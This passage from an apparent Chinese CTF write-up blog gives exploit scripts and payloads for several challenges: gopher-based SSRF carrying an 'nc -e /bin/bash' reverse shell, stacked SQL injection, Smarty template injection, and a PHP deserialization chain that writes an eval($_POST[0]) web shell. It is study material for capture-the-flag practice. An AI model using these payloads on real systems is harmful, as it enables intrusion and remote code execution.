<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://zhuanlan.zhihu.com/p/<span class="number">112055947</span></span><br><span class="line">脚本：</span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2,urllib</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span></span><br><span class="line">header = <span class="string">&quot;&quot;&quot;gopher://192.168.0.119:8080/_GET /S2-045/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host:192.168.0.119</span></span><br><span class="line"><span class="string">Content-Type:&quot;&quot;&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;nc -e /bin/bash 192.168.0.109 6666&quot;</span></span><br><span class="line">content_type = <span class="string">&quot;&quot;&quot;自己填写(不要有换行)&quot;&quot;&quot;</span></span><br><span class="line">header_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">content_type_encoder_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">url_char = [<span class="string">&quot; &quot;</span>]</span><br><span class="line">nr = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码请求头</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> header:</span><br><span class="line">    <span class="keyword">if</span> single_char <span class="keyword">in</span> url_char:</span><br><span class="line">        header_encoder += urllib.quote(urllib.quote(single_char,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        header_encoder += single_char</span><br><span class="line"></span><br><span class="line">header_encoder = header_encoder.replace(<span class="string">&quot;\n&quot;</span>,urllib.quote(urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码content-type，第一次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder = content_type_encoder.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>) + urllib.quote(nr,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 编码content-type，第二次编码</span></span><br><span class="line"><span class="keyword">for</span> single_char <span class="keyword">in</span> content_type_encoder:</span><br><span class="line">    <span class="comment"># 先转为ASCII,在转十六进制即可变为URL编码</span></span><br><span class="line">    content_type_encoder_2 += <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)))</span><br><span class="line">content_type_encoder_2 = content_type_encoder_2.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">exp = url + header_encoder + content_type_encoder_2</span><br><span class="line"><span class="built_in">print</span> exp</span><br><span class="line">request = urllib2.Request(exp)</span><br><span class="line">response = urllib2.urlopen(request).read()</span><br><span class="line"><span class="built_in">print</span> response</span><br></pre></td></tr></table></figure>

<p>其实会打ssrf的话这题并不是很难，跟强网杯的随便注是一个意思，直接照抄思路即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># z = &quot;username=&#123;&#125;&amp;password=123&quot;.format((</span></span><br><span class="line"><span class="comment">#                                           &quot;admin1&#x27;;use ctf2;rename table fake_admin to fake_admin1;rename table &quot;</span></span><br><span class="line"><span class="comment">#                                           &quot;real_admin_here_do_you_find to fake_admin;show tables;#&quot;))</span></span><br><span class="line">z = <span class="string">&quot;username=&#123;&#125;&amp;password=123&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;admin&#x27;;show databases;&quot;</span>)</span><br><span class="line"><span class="comment"># table real_admin_here_do_you_find</span></span><br><span class="line"><span class="comment"># use ctf2;rename table real_admin_here_do_you_find to fake_admin</span></span><br><span class="line"><span class="comment"># z=&quot;username=&#123;&#125;&amp;password=123&quot;.format((&quot;admin1&#x27;;use ctf2;desc real_admin_here_do_you_find;#&quot;))</span></span><br><span class="line"><span class="comment"># z=&quot;username=admin&amp;password=5fb4e07de914cfc82afb44vbaf402203&quot;</span></span><br><span class="line">a = <span class="string">&#x27;&#x27;&#x27;POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = a.<span class="built_in">format</span>(<span class="built_in">len</span>(z), z)</span><br><span class="line">res = urllib.parse.quote(urllib.parse.quote(a).replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0d%0A&#x27;</span>))</span><br><span class="line"><span class="comment"># payload = &#x27;gopher://127.0.0.1/_&#x27;+res</span></span><br><span class="line">payload = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + res + <span class="string">&quot;%250d%250A&quot;</span></span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure>

<p>再ctf2中我们可以查看到：</p>
<p><img src="image-20210403205334277.png" alt="image-20210403205334277"></p>
<h1 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h1>]]></content>
      <tags>
        <tag>PHP</tag>
        <tag>SSRF</tag>
        <tag>[object Object]</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2019WEB11</title>
    <url>/2020/12/08/CISCN2019WEB11/</url>
    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><ol>
<li>XFF注入</li>
<li>模板注入smarty</li>
</ol>
<h2 id="smarty"><a href="#smarty" class="headerlink" title="smarty"></a>smarty</h2><p>​    这是PHP的一个模板语言，类似于flask的jinjia2，smarty也可以让我们解析PHP的逻辑语言，比如，我们可以通过{system(“ls”)}执行系统命令，除此之外，PHPsmarty还有很多骚思路：</p>
<h3 id="php-php"><a href="#php-php" class="headerlink" title="{php}{/php}"></a>{php}{/php}</h3><p> 可以执行php的代码</p>
<p>例子：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;eval($_POST[0]);&#123;/php&#125;</span><br></pre></td></tr></table></figure>

<h3 id="literal"><a href="#literal" class="headerlink" title="{literal}"></a>{literal}</h3><p>该标签可以让一段标签代码原样输出，在这种情况下我们可以使用：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;literal&#125;&lt;script language=&quot;php&quot;&gt;system(&quot;ls&quot;);&lt;/script&gt;&#123;/literal&#125;</span><br></pre></td></tr></table></figure>

<h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(“file:///etc/passwd”)&#125;</span><br></pre></td></tr></table></figure>

<h3 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h3><p>官方文档中看到这样的描述：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span><br></pre></td></tr></table></figure>

<p>上述都摘自文章：<a href="https://blog.csdn.net/qq_45521281/article/details/107556915">https://blog.csdn.net/qq_45521281/article/details/107556915</a></p>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>题目开始就给了IP的地方，所以我们可以直接在这里进行注入，开始我还以为是SQLMAP。。不过后来发现不是，是SMARTY模板注入</p>
<p>故我们直接在XXF输出{system(“cat /flag”)} 或者{if system(“cat /flag”)}{/if}</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF2019SSRFMe</title>
    <url>/2021/01/12/De1CTF2019SSRFMe/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>SSRF</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>EIS2019_EZPOP</title>
    <url>/2021/03/26/EIS2019-EZPOP/</url>
    <content><![CDATA[<p>题目开局给源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一眼就看到了file_put_contents，那么利用肯定也是通过这个，发现他在set方法当中，回溯哪里能用到set方法，</p>
<p>A类当中肯定给了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就简单了。只不过题目还需要绕过等等比较烦，base64比较烦人，其他都还好（指调了好久）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key , $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        var_dump($contents);</span></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"><span class="comment">//        var_dump($cleaned);</span></span><br><span class="line"><span class="comment">//        print_r(json_encode([$cleaned, $this-&gt;complete]));</span></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"><span class="comment">//        echo $contents;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"><span class="comment">//        print_r($serialize);</span></span><br><span class="line"><span class="comment">//        print_r($serialize($data));</span></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        var_dump($name);</span></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"><span class="comment">//        print_r($filename);</span></span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"><span class="comment">//        print_r($dir);</span></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//            print_r($data);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        print_r($filename);</span></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line"><span class="comment">//        print_r(base64_decode($data));</span></span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line"><span class="comment">//            echo 1;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        echo 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (isset($_GET[&#x27;src&#x27;]))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//$dir = &quot;uploads/&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (!is_dir($dir))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    mkdir($dir);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&quot;strval&quot;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;exprie&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//key 经过转换后变成filename</span></span><br><span class="line"><span class="comment">//contents经过转换后写入到文件当中</span></span><br><span class="line"><span class="comment">//$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span></span><br><span class="line">$a = <span class="keyword">new</span> A($b,<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=4.php&#x27;</span>,<span class="number">111</span>);</span><br><span class="line"></span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;111PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>反序列化</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Easy_Tomcat</title>
    <url>/2021/03/22/Easy-Tomcat/</url>
    <content><![CDATA[<p>没做过java题目</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Tomcat</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2018RCEService</title>
    <url>/2020/11/17/FBCTF2018RCEService/</url>
    <content><![CDATA[<p>要盲试试出来。。。大佬说是有源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span 